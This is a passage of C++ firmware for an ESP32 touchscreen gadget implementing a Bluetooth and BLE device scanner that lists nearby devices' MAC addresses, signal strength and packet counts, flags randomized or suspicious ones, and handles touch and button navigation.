              displayLines[i].originalColor = GREEN;
              displayLines[i].isAlert = false;
              displayLines[i].flashUntil = 0;
              displayLines[i].type = MessageType::DEVICE;
            }
            refreshDisplay();
            addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
          break;
        case 1: 
           filterSuspicious();
          break;
        case 2: // Back icon action (exit to submenu)
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      // Handle icon bar touches
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
      // Handle device list touch selection
      else if (currentView == ViewMode::LIST_VIEW) {
        int listStartY = Y_OFFSET + HEADER_HEIGHT + 5;
        int rowHeight = 18;
        if (y >= listStartY && y < listStartY + (VISIBLE_ROWS * rowHeight)) {
          int touchedRow = (y - listStartY) / rowHeight;
          int deviceIdx = listScrollOffset + touchedRow;
          if (deviceIdx < deviceCount) {
            selectedDeviceIndex = deviceIdx;
            currentView = ViewMode::DETAIL_VIEW;
            lastListUpdate = 0;
          }
        }
      }
      // Handle detail view touch (action buttons)
      else if (currentView == ViewMode::DETAIL_VIEW) {
        int startY = Y_OFFSET + HEADER_HEIGHT + 5;
        int buttonY = startY + 28 + (18 * 8) + 25;

        if (y >= buttonY && y < buttonY + 25) {
          if (x >= 5 && x < 115) {
            // COPY MAC button - flash feedback
            tft.fillRect(5, buttonY, 110, 25, SHREDDY_TEAL);
            delay(100);
            lastListUpdate = 0;
          } else if (x >= 125 && x < 235) {
            // TRACK button - flash feedback
            tft.fillRect(125, buttonY, 110, 25, SHREDDY_PINK);
            delay(100);
            lastListUpdate = 0;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

public:
  void setup() {
    // FIRST: Stop any active scans from previous session
    scanning = false;  // Prevent callbacks from adding devices
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      pBLEScan->clearResults();
    }
    esp_bt_gap_cancel_discovery();
    delay(100);  // Let pending callbacks complete

    // NOW reset all state for clean re-entry
    deviceCount = 0;
    suspiciousCount = 0;
    lineNumber = 1;
    newDevicesThisScan = 0;
    lastDeviceCount = -1;
    lastSuspiciousCount = -1;
    scanning = true;
    isBLEScanActive = true;
    lastScanTime = 0;
    lastFlashToggle = 0;
    flashState = false;
    pBLEScan = nullptr;
    pDeviceCallbacks = nullptr;

    // Clear device and display arrays
    for (int i = 0; i < MAX_DEVICES; i++) {
      devices[i] = DeviceInfo();
    }
    for (int i = 0; i < MAX_LINES; i++) {
      displayLines[i] = DisplayLine();
    }

    // Reset view state
    currentView = ViewMode::LIST_VIEW;
    selectedDeviceIndex = -1;
    listScrollOffset = 0;
    highlightedRow = 0;
    lastListUpdate = 0;

    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();

    setupTouchscreen();

    // Initialize button pins for navigation
    pcf.pinMode(BTN_UP, INPUT_PULLUP);
    pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
    pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
    pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

    initDisplay();

    // Check BT controller status and initialize if needed
    esp_bt_controller_status_t bt_status = esp_bt_controller_get_status();

    if (bt_status == ESP_BT_CONTROLLER_STATUS_IDLE) {
      // Controller not initialized - do full init
      esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
      if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
        addLine("Failed to init BT controller", RED, true, MessageType::ALERT);
        return;
      }
      if (esp_bt_controller_enable(ESP_BT_MODE_BTDM) != ESP_OK) {
        addLine("Failed to enable BT controller", RED, true, MessageType::ALERT);
        return;
      }
      if (esp_bluedroid_init() != ESP_OK) {
        addLine("Failed to init Bluedroid", RED, true, MessageType::ALERT);
        return;
      }
      if (esp_bluedroid_enable() != ESP_OK) {
        addLine("Failed to enable Bluedroid", RED, true, MessageType::ALERT);
        return;
      }
    } else if (bt_status == ESP_BT_CONTROLLER_STATUS_INITED) {
      // Controller inited but not enabled
      if (esp_bt_controller_enable(ESP_BT_MODE_BTDM) != ESP_OK) {
        addLine("Failed to enable BT controller", RED, true, MessageType::ALERT);
        return;
      }
      if (esp_bluedroid_init() != ESP_OK) {
        addLine("Failed to init Bluedroid", RED, true, MessageType::ALERT);
        return;
      }
      if (esp_bluedroid_enable() != ESP_OK) {
        addLine("Failed to enable Bluedroid", RED, true, MessageType::ALERT);
        return;
      }
    }
    // If ESP_BT_CONTROLLER_STATUS_ENABLED, already good

    // Initialize BLE after controller is ready
    BLEDevice::init("");
    pBLEScan = BLEDevice::getScan();
    pDeviceCallbacks = new AdvertisedDeviceCallbacks(*this);
    pBLEScan->setAdvertisedDeviceCallbacks(pDeviceCallbacks);
    pBLEScan->setActiveScan(true);

    // Register classic BT callback
    esp_bt_gap_register_callback(btCallback);

    addLine("Bluetooth Sniffer Ready", DARK_GRAY, true, MessageType::STATUS);
    startBLEScan();
  }

  void loop() {
    unsigned long now = millis();
    tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);

    updateStatusBar();
    runUI();
    cleanupDevices(now);

    // Handle button navigation for list/detail views
    handleNavigation();

    // Draw current view
    if (now - lastListUpdate >= 500) {  // Update display every 500ms
      switch (currentView) {
        case ViewMode::LIST_VIEW:
          drawListView();
          break;
        case ViewMode::DETAIL_VIEW:
          drawDetailView();
          break;
        case ViewMode::LOG_VIEW:
        default:
          updateDisplay();
          break;
      }
      lastListUpdate = now;
    }

    if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
      if (isBLEScanActive) {
        pBLEScan->stop();
        startBTScan();
        isBLEScanActive = false;
      } else {
        esp_bt_gap_cancel_discovery();
        startBLEScan();
        isBLEScanActive = true;
      }
      lastScanTime = now;
    }
  }

  void handleNavigation() {
    static unsigned long lastButtonCheck = 0;
    if (millis() - lastButtonCheck < 150) return;  // Debounce
    lastButtonCheck = millis();

    // UP button - scroll up / previous device
    if (!pcf.digitalRead(BTN_UP)) {
      if (currentView == ViewMode::LIST_VIEW) {
        if (highlightedRow > 0) {
          highlightedRow--;
        } else if (listScrollOffset > 0) {
          listScrollOffset--;
        }
        lastListUpdate = 0;  // Force redraw
      } else if (currentView == ViewMode::DETAIL_VIEW) {
        // Go to previous device
        if (selectedDeviceIndex > 0) {
          selectedDeviceIndex--;
          lastListUpdate = 0;
        }
      }
    }

    // DOWN button - scroll down / next device
    if (!pcf.digitalRead(BTN_DOWN)) {
      if (currentView == ViewMode::LIST_VIEW) {
        int maxHighlight = min(VISIBLE_ROWS - 1, deviceCount - listScrollOffset - 1);
        if (highlightedRow < maxHighlight) {
          highlightedRow++;
        } else if (listScrollOffset + VISIBLE_ROWS < deviceCount) {
          listScrollOffset++;
        }
        lastListUpdate = 0;  // Force redraw
      } else if (currentView == ViewMode::DETAIL_VIEW) {
        // Go to next device
        if (selectedDeviceIndex < deviceCount - 1) {
          selectedDeviceIndex++;
          lastListUpdate = 0;
        }
      }
    }

    // LEFT button - back to list from detail
    if (!pcf.digitalRead(BTN_LEFT)) {
      if (currentView == ViewMode::DETAIL_VIEW) {
        currentView = ViewMode::LIST_VIEW;
        lastListUpdate = 0;
      }
    }

    // RIGHT button - select device / enter detail view
    if (!pcf.digitalRead(BTN_RIGHT)) {
      if (currentView == ViewMode::LIST_VIEW && deviceCount > 0) {
        selectedDeviceIndex = listScrollOffset + highlightedRow;
        if (selectedDeviceIndex < deviceCount) {
          currentView = ViewMode::DETAIL_VIEW;
          lastListUpdate = 0;
        }
      }
    }
  }

  class AdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    BluetoothSniffer& sniffer;
  public:
    AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      String mac = advertisedDevice.getAddress().toString().c_str();
      int rssi = advertisedDevice.getRSSI();
      unsigned long timestamp = millis();
      int idx = -1;
      for (int i = 0; i < sniffer.deviceCount; i++) {
        if (sniffer.devices[i].mac == mac && sniffer.devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        sniffer.devices[idx].rssi = rssi;
        sniffer.devices[idx].packetCount++;
        sniffer.devices[idx].lastSeen = timestamp;
        if (sniffer.isRandomizedMac(mac)) {
          sniffer.devices[idx].macChangeCount++;
        }
        sniffer.checkSuspiciousActivity(idx, timestamp);
      } else {
        sniffer.processNewDevice(&advertisedDevice, nullptr, timestamp, true);
      }
    }
  };

  static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (!snifferInstance) return;
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
      unsigned long timestamp = millis();
      int idx = -1;
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
               param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
      String mac = macStr;
      for (int i = 0; i < snifferInstance->deviceCount; i++) {
        if (snifferInstance->devices[i].mac == mac && !snifferInstance->devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        snifferInstance->devices[idx].packetCount++;
        snifferInstance->devices[idx].lastSeen = timestamp;
        snifferInstance->checkSuspiciousActivity(idx, timestamp);
      } else {
        snifferInstance->processNewDevice(nullptr, param, timestamp, false);
      }
    }
  }

  void startBLEScan() {
    newDevicesThisScan = 0;
    pBLEScan->start(Config::bleScanDuration, false);
    addLine("BLE Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void startBTScan() {
    newDevicesThisScan = 0;
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, Config::btScanDuration, 0);
    addLine("Classic BT Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void setSnifferInstance() {
    snifferInstance = this;
  }

  void cleanup() {
    // Stop any active scans
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      pBLEScan->clearResults();
    }
    esp_bt_gap_cancel_discovery();

    // Cleanup callback pointer
    if (pDeviceCallbacks != nullptr) {
      delete pDeviceCallbacks;
      pDeviceCallbacks = nullptr;
    }

    // Deinit BLE but keep BT controller running for faster re-entry
    BLEDevice::deinit(false);  // false = don't release BT controller

    // Reset state
    pBLEScan = nullptr;
    scanning = false;
  }
};

BluetoothSniffer* BluetoothSniffer::snifferInstance = nullptr;
BluetoothSniffer sniffer;

void blesnifferSetup() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  sniffer.setup();
  sniffer.setSnifferInstance();
}

void blesnifferLoop() {
  sniffer.loop();
}

void blesnifferCleanup() {
  sniffer.cleanup();
}

}  // namespace BleSniffer
